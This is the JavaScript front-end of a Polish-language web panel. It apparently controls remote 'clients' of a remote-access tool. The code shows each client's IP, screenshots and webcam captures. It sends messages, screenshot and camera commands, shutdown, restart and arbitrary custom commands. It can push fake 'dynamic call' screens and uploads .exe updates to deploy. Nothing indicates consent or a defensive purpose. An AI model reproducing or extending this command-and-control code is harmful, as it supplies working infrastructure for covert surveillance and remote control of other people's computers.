// ===================== KONFIG =====================
const API = {
    clients:    '/api/clients',
    allClients: '/api/get_all_clients',
    rename:     '/api/rename_client',
    command:    '/api/send_command',
    call:       '/api/send_dynamic_call',
    namesFile:  '/api/get_names_file',
    saveNames:  '/api/save_names_file',
    screenshot: (id) => `/api/get_screenshot/${id}`,
    camera:     (id) => `/api/get_camera/${id}`,
    updatesList:'/api/updates/list',
    updatesUp:  '/api/updates/upload',
    debug:      '/api/debug/updates',
    ping:       '/api/ping',
};

let autoRefreshTimer = null;
let currentClients = [];
let nameCache = {};

// ===================== UTIL =====================
async function api(url, opts = {}) {
    try {
        const res = await fetch(url, opts);
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const ct = res.headers.get('content-type') || '';
        return ct.includes('json') ? res.json() : res.text();
    } catch (e) {
        console.error('API error', url, e);
        return null;
    }
}

function toast(msg, type = '') {
    const c = document.getElementById('toast-container');
    const el = document.createElement('div');
    el.className = 'toast ' + type;
    el.textContent = msg;
    c.appendChild(el);
    setTimeout(() => { el.style.opacity = '0'; el.style.transition = 'opacity .3s'; setTimeout(() => el.remove(), 300); }, 3000);
}

function escapeHtml(s) {
    return String(s ?? '').replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));
}

function fmtTime(ts) {
    if (!ts) return '—';
    const d = new Date(ts * 1000);
    return d.toLocaleTimeString('pl-PL');
}

function openModal(html) {
    const ov = document.getElementById('modal-overlay');
    document.getElementById('modal-content').innerHTML = html;
    ov.classList.add('show');
}
function closeModal() {
    document.getElementById('modal-overlay').classList.remove('show');
}
document.getElementById('modal-overlay').addEventListener('click', e => {
    if (e.target.id === 'modal-overlay') closeModal();
});
document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });

// ===================== TABS =====================
document.querySelectorAll('.tab').forEach(t => {
    t.addEventListener('click', () => {
        document.querySelectorAll('.tab').forEach(x => x.classList.remove('active'));
        document.querySelectorAll('.tab-panel').forEach(x => x.classList.remove('active'));
        t.classList.add('active');
        document.getElementById('tab-' + t.dataset.tab).classList.add('active');

        if (t.dataset.tab === 'names') loadNames();
        if (t.dataset.tab === 'updates') loadUpdates();
        if (t.dataset.tab === 'debug') loadDebug();
    });
});

// ===================== CLIENTS =====================
async function loadClients() {
    const data = await api(API.clients);
    if (!Array.isArray(data)) return;
    currentClients = data;
    renderClients();
}

function renderClients() {
    const grid = document.getElementById('clients-grid');
    const search = document.getElementById('client-search').value.toLowerCase();
    const filter = document.getElementById('client-filter').value;

    let list = currentClients.filter(c => {
        const matchSearch = !search ||
            (c.name || '').toLowerCase().includes(search) ||
            (c.id || '').toLowerCase().includes(search) ||
            (c.ip || '').toLowerCase().includes(search);
        if (!matchSearch) return false;

        switch (filter) {
            case 'active': return c.status === 'active';
            case 'inactive': return c.status === 'inactive';
            case 'screenshot': return c.has_screenshot;
            case 'camera': return c.has_camera;
        }
        return true;
    });

    document.getElementById('clients-badge').textContent = currentClients.length;

    if (list.length === 0) {
        grid.innerHTML = '<div class="empty-state">Brak klientów spełniających kryteria.</div>';
        return;
    }

    grid.innerHTML = list.map(c => {
        const active = c.status === 'active';
        const shotUrl = c.has_screenshot ? `${API.screenshot(c.id)}?t=${Date.now()}` : '';
        return `
        <div class="client-card ${active ? '' : 'inactive'}" data-id="${escapeHtml(c.id)}">
            <div class="client-preview" onclick="viewShot('${escapeHtml(c.id)}','screenshot')">
                ${c.has_screenshot
                    ? `<img src="${shotUrl}" alt="screenshot" onerror="this.parentElement.innerHTML='<div class=no-preview>📷</div>'">`
                    : `<div class="no-preview">📷</div>`}
            </div>
            <div class="client-body">
                <div class="client-name">
                    ${escapeHtml(c.name || 'Klient')}
                    ${c.hasCustomName ? '<span title="Nazwa niestandardowa" style="opacity:.6">✏️</span>' : ''}
                </div>
                <div class="client-id">${escapeHtml(c.id)}</div>
                <div class="client-meta">
                    <span class="status-pill ${active ? '' : 'inactive'}">${active ? 'Aktywny' : 'Nieaktywny'}</span>
                    <span>${escapeHtml(c.ip || '')}</span>
                </div>
                <div class="badges">
                    <span class="mini-badge ${c.has_screenshot ? 'has' : ''}">📸 Screenshot</span>
                    <span class="mini-badge ${c.has_camera ? 'has' : ''}">📷 Kamera</span>
                </div>
                <div class="client-actions">
                    <button class="btn btn-ghost" onclick="viewShot('${escapeHtml(c.id)}','screenshot')">📸 Podgląd</button>
                    <button class="btn btn-ghost" onclick="viewShot('${escapeHtml(c.id)}','camera')">📷 Kamera</button>
                    <button class="btn btn-ghost" onclick="openRename('${escapeHtml(c.id)}','${escapeHtml(c.name)}')">✏️ Zmień nazwę</button>
                    <button class="btn btn-ghost" onclick="openCommand('${escapeHtml(c.id)}')">⚡ Komenda</button>
                    <button class="btn btn-primary" style="grid-column: span 2;" onclick="openCall('${escapeHtml(c.id)}')">📞 Dynamiczne połączenie</button>
                </div>
            </div>
        </div>`;
    }).join('');
}

// Podgląd zdjęcia
function viewShot(id, type) {
    const url = type === 'screenshot' ? API.screenshot(id) : API.camera(id);
    openModal(`
        <h2>${type === 'screenshot' ? '📸 Screenshot' : '📷 Kamera'} — ${escapeHtml(id)}</h2>
        <img src="${url}?t=${Date.now()}" alt="preview"
             onerror="this.outerHTML='<div class=empty-state>Brak obrazu</div>'">
        <div class="modal-actions">
            <button class="btn btn-ghost" onclick="closeModal()">Zamknij</button>
            <a class="btn btn-primary" href="${url}" target="_blank">Otwórz w nowej karcie</a>
        </div>
    `);
}

// Zmiana nazwy
function openRename(id, current) {
    openModal(`
        <h2>✏️ Zmiana nazwy klienta</h2>
        <p style="color:var(--text-dim);font-size:13px">ID: <code>${escapeHtml(id)}</code></p>
        <label>Nowa nazwa
            <input id="rename-input" value="${escapeHtml(current || '')}" maxlength="50" autofocus>
        </label>
        <div class="modal-actions">
            <button class="btn btn-ghost" onclick="closeModal()">Anuluj</button>
            <button class="btn btn-primary" onclick="doRename('${escapeHtml(id)}')">💾 Zapisz</button>
        </div>
    `);
    setTimeout(() => document.getElementById('rename-input').select(), 50);
}

async function doRename(id) {
    const name = document.getElementById('rename-input').value.trim();
    if (!name) return toast('Nazwa nie może być pusta', 'err');
    const res = await api(API.rename, {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({clientId: id, newName: name})
    });
    if (res && res.success) { toast('Zmieniono nazwę ✅', 'ok'); closeModal(); loadClients(); }
    else toast('Błąd: ' + (res?.error || 'nieznany'), 'err');
}

// Komenda tekstowa
function openCommand(id) {
    openModal(`
        <h2>⚡ Wyślij komendę do ${escapeHtml(id)}</h2>
        <label>Typ komendy
            <select id="cmd-type">
                <option value="message">💬 Komunikat</option>
                <option value="screenshot">📸 Zrób screenshot</option>
                <option value="camera">📷 Zrób zdjęcie kamery</option>
                <option value="shutdown">⛔ Zamknij program</option>
                <option value="restart">🔄 Restart programu</option>
                <option value="custom">✏️ Własna</option>
            </select>
        </label>
        <label>Treść / własna komenda
            <textarea id="cmd-text" placeholder="Wpisz treść komunikatu lub własną komendę..."></textarea>
        </label>
        <div class="modal-actions">
            <button class="btn btn-ghost" onclick="closeModal()">Anuluj</button>
            <button class="btn btn-primary" onclick="sendCommand('${escapeHtml(id)}')">📤 Wyślij</button>
        </div>
    `);
}

async function sendCommand(id) {
    const type = document.getElementById('cmd-type').value;
    const text = document.getElementById('cmd-text').value.trim();

    let cmd = '';
    if (type === 'message') cmd = `message:${text}`;
    else if (type === 'custom') cmd = text;
    else cmd = type;

    if (!cmd) return toast('Podaj treść komendy', 'err');

    const res = await api(API.command, {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({client_id: id, command: cmd})
    });
    if (res && res.success) { toast('Komenda wysłana ✅', 'ok'); closeModal(); }
    else toast('Błąd: ' + (res?.error || 'nieznany'), 'err');
}

// Dynamiczne połączenie
function openCall(id) {
    openModal(`
        <h2>📞 Dynamiczne połączenie — ${escapeHtml(id)}</h2>
        <label>Imię / Nazwa
            <input id="call-name" placeholder="np. Jan Kowalski">
        </label>
        <label>URL obrazka (opcjonalnie)
            <input id="call-img" placeholder="https://example.com/photo.jpg">
        </label>
        <label>Kolor tła
            <select id="call-bg">
                <option value="black">Czarny</option>
                <option value="darkblue">Granatowy</option>
                <option value="darkred">Ciemnoczerwony</option>
                <option value="darkgreen">Ciemnozielony</option>
            </select>
        </label>
        <div class="modal-actions">
            <button class="btn btn-ghost" onclick="closeModal()">Anuluj</button>
            <button class="btn btn-primary" onclick="sendCall('${escapeHtml(id)}')">📞 Wyślij</button>
        </div>
    `);
}

async function sendCall(id) {
    const name = document.getElementById('call-name').value.trim();
    if (!name) return toast('Podaj imię', 'err');

    const body = {
        client_id: id,
        name,
        image_url: document.getElementById('call-img').value.trim() || null,
        bg_color: document.getElementById('call-bg').value
    };
    const res = await api(API.call, {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify(body)
    });
    if (res && res.success) { toast('Wysłano połączenie ✅', 'ok'); closeModal(); }
    else toast('Błąd: ' + (res?.error || 'nieznany'), 'err');
}

// Filtry
document.getElementById('client-search').addEventListener('input', renderClients);
document.getElementById('client-filter').addEventListener('change', renderClients);

// ===================== NAMES =====================
async function loadNames() {
    const text = await api(API.namesFile);
    document.getElementById('names-editor').value = text || '';
}

document.getElementById('names-reload').addEventListener('click', async () => {
    await loadNames();
    toast('Wczytano plik', 'ok');
});

document.getElementById('names-save').addEventListener('click', async () => {
    const content = document.getElementById('names-editor').value;
    const status = document.getElementById('names-status');
    const res = await api(API.saveNames, {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({content})
    });
    if (res && res.success) {
        status.className = 'status-msg ok'; status.textContent = '✅ Zapisano pomyślnie';
        toast('Zapisano name.txt ✅', 'ok');
        loadClients();
    } else {
        status.className = 'status-msg err'; status.textContent = '❌ ' + (res?.error || 'Błąd');
    }
});

// ===================== UPDATES =====================
async function loadUpdates() {
    const data = await api(API.updatesList);
    const list = document.getElementById('updates-list');
    const view = document.getElementById('versions-view');

    if (!data || !data.success) {
        list.innerHTML = '<div class="empty-state">Błąd wczytywania</div>';
        return;
    }

    if (!data.files || data.files.length === 0) {
        list.innerHTML = '<div class="empty-state">Brak plików .exe</div>';
    } else {
        list.innerHTML = data.files.map(f => `
            <div class="update-item">
                <div>
                    <div class="name">📦 ${escapeHtml(f.filename)}</div>
                    <div class="meta">${(f.size/1024/1024).toFixed(2)} MB • ${escapeHtml(f.modified)}</div>
                </div>
                <a class="btn btn-ghost" href="/api/updates/download/${encodeURIComponent(f.filename)}">⬇️ Pobierz</a>
            </div>
        `).join('');
    }

    view.textContent = JSON.stringify(data.versions, null, 2);
}

document.getElementById('updates-refresh').addEventListener('click', loadUpdates);

document.getElementById('upload-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    const status = document.getElementById('upload-status');
    const fd = new FormData(e.target);
    if (!fd.get('force')) fd.set('force', 'false');

    status.className = 'status-msg'; status.textContent = '⏳ Wysyłanie...';

    try {
        const res = await fetch(API.updatesUp, { method: 'POST', body: fd });
        const data = await res.json();
        if (data.success) {
            status.className = 'status-msg ok';
            status.textContent = '✅ Wgrano: ' + data.filename;
            toast('Aktualizacja wgrana ✅', 'ok');
            e.target.reset();
            loadUpdates();
        } else {
            status.className = 'status-msg err';
            status.textContent = '❌ ' + (data.error || 'Błąd');
        }
    } catch (err) {
        status.className = 'status-msg err';
        status.textContent = '❌ ' + err.message;
    }
});

// ===================== DEBUG =====================
async function loadDebug() {
    const data = await api(API.debug);
    document.getElementById('debug-view').textContent = JSON.stringify(data, null, 2);
    const ping = await api(API.ping);
    document.getElementById('ping-view').textContent = JSON.stringify(ping, null, 2);
}

document.getElementById('debug-refresh').addEventListener('click', loadDebug);

// ===================== SERVER STATUS =====================
async function pingServer() {
    const data = await api(API.ping);
    const dot = document.getElementById('server-status');
    const info = document.getElementById('server-info');
    if (data && data.status === 'online') {
        dot.classList.add('online');
        info.textContent = `Online • Klientów: ${data.clients_count} • Nazw: ${data.custom_names_count}`;
    } else {
        dot.classList.remove('online');
        info.textContent = 'Offline';
    }
}

// ===================== AUTO REFRESH =====================
function startAutoRefresh() {
    stopAutoRefresh();
    autoRefreshTimer = setInterval(() => {
        const activeTab = document.querySelector('.tab.active')?.dataset.tab;
        if (activeTab === 'clients') loadClients();
        if (activeTab === 'updates') loadUpdates();
    }, 3000);
}
function stopAutoRefresh() {
    if (autoRefreshTimer) clearInterval(autoRefreshTimer);
    autoRefreshTimer = null;
}

document.getElementById('auto-refresh').addEventListener('change', e => {
    e.target.checked ? startAutoRefresh() : stopAutoRefresh();
});

document.getElementById('refresh-btn').addEventListener('click', () => {
    const activeTab = document.querySelector('.tab.active')?.dataset.tab;
    if (activeTab === 'clients') loadClients();
    else if (activeTab === 'names') loadNames();
    else if (activeTab === 'updates') loadUpdates();
    else if (activeTab === 'debug') loadDebug();
    pingServer();
});

// ===================== INIT =====================
(async function init() {
    await pingServer();
    await loadClients();
    startAutoRefresh();
    setInterval(pingServer, 10000);
})();
